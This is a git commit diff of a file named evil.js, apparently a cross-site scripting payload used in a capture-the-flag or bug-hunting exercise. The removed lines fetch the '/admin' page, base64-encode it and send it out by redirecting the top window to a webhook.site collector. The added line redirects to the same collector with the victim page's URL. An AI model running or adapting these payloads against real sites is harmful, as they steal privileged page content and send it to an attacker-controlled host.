626c281af788783453d79cff8d4f337518b5309e
Heru Kristanto <99137032+NicoIzumi30@users.noreply.github.com>
2025-08-30 12:45:03 +0700

    Update evil.js

--- evil.js
+++ evil.js
@@ -1,5 +1,1 @@
-// lebih kuat pakai top.location biar keluar dari iframe/foreignObject
-fetch('/admin')
-  .then(r => r.text())
-  .then(t => { top.location = 'https://webhook.site/f4b566c7-84f9-47fb-b385-611fe96486d1?data=' + btoa(t) })
-  .catch(e => { top.location = 'https://webhook.site/f4b566c7-84f9-47fb-b385-611fe96486d1?err=' + encodeURIComponent(e) })
+top.location = 'https://webhook.site/f4b566c7-84f9-47fb-b385-611fe96486d1?exec=1&loc=' + encodeURIComponent(location.href);
